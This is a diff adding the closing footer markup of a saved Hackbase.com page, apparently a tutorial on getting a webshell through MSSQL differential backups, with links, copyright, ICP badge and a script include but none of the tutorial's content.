+ |&nbsp; <a href="http://www.hackbase.com/about/jobs.html" target="_blank">诚聘英才</a>
+
+ |&nbsp; <a href="http://www.hackbase.com/about/ads.html" target="_blank">广告服务</a>
+
+ |&nbsp; <a href="http://www.hackbase.com/about/tougao.html" target="_blank">投稿指南</a>
+
+</p>
+<p></p><p><font color="#808080">Copyright &#169; 2010 Hackbase.com International. All Rights Reserved. 黑基网 版权所有</font></p>
+<p>&nbsp;</p><p></p>
+<table border="0" width="910" id="icpno" cellspacing="0" cellpadding="0" align="center">
+<tbody><tr><td width="330"></td>
+<td align="center" width="250"><table><tbody><tr>
+<td width="49" rowspan="2">
+<img src="./mssql差异备份获得的webshell-学院-黑基网_files/icp.gif" align="right" width="40" height="48"></td>
+<td width="120">
+<p align="center"><a target="_blank" style="color: #FF0000; text-decoration: underline" href="http://www.miibeian.gov.cn/">京ICP备05010001号</a></p></td>
+<td rowspan="2"><img border="0" src="./mssql差异备份获得的webshell-学院-黑基网_files/police.gif" width="38" height="43"></td>
+</tr>
+<tr>
+<td width="120">
+<p align="center"><font color="#666">中国网通·中国电信</font></p></td>
+</tr></tbody></table>
+</td>
+<td width="330"></td>
+</tr>
+</tbody></table>
+
+</div>
+</div>
+<script type="text/javascript" src="./mssql差异备份获得的webshell-学院-黑基网_files/Std_StranJF.Js"></script>
+
+</body></html>
